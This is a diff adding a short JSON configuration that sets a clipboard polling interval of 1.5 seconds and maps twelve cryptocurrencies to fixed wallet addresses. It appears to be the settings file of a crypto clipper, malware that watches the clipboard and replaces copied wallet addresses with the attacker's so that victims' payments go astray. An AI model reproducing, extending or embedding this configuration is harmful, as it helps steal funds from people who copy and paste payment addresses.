@@ -1,0 +1,17 @@
+{
+  "clipboard_check_interval": 1.5,
+  "address_map": {
+    "BTC": "12bQP7qubLdcMBQ5RjRUYmAVWxuTSbMNrq",
+    "ETH": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
+    "USDT": "TEp8h5W97NZyKcN1556Cb5nq7moDevUit1",
+    "DOGE": "DJwebawN3yYMUDQ6PdyGfurPTveu7nUjEG",
+    "XRP": "rEeZbBwbmtKFjnmafpn1XTC1dYfmexUy1G",
+    "ADA": "addr1q97eccpehpj8rtadcuj6tf66km8jpty8rfdmczvkvgawp5uz2tn0zncxwwyzd92zkmgjflzkpv4fw575p2wyv3sc4g0smx204y",
+    "SOL": "BWLQCEvaqKH2PTp3kEhM3ts4bUG6JLT7y8L1vv16vE13",
+    "LTC": "ltc1q6126xwpg2kfkrgesvtrq3rnukhnten069jcg6d",
+    "BNB": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
+    "USDT_MATIC": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
+    "MATIC": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9",
+    "USDT_ETH": "0x28805b5e3dfc30b4932d444d7Bb705938FE201a9"
+  }
+}
